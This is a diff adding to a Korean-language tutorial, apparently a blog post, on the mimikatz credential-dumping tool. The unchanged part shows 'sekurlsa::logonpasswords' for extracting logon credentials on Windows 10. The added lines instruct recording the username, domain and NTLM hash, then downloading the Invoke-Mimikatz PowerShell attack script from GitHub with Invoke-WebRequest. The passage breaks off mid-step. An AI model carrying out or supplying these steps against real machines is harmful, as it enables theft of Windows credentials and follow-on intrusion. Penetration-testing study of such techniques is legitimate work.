@@ -52,3 +52,17 @@ mimikatz # sekurlsa::logonpasswords
 관리자계정이 아닌 다른 계정으로 mimikatz를 실행해주시고 위와 같이 명령어를 입력해주시면 위와 같이 정보를 얻을 수 있습니다.
 
 윈도우10 OS에서도 실행되는 것을 확인했습니다.
+
+위에서 얻은 정보 중 Username, Domain, NTLM 정보를 적어놓습니다. 이후 파워쉘을 실행하고 Mimikatz 파워쉘 스크립트를 아래 명령어로 다운로드 받습니다.
+
+```
+
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1 -OutFile Invoke-Mimikatz.ps1
+
+```
+
+위에서 다운로드 받게되면 아래 파일이 생깁니다.
+
+사진
+
+이후 
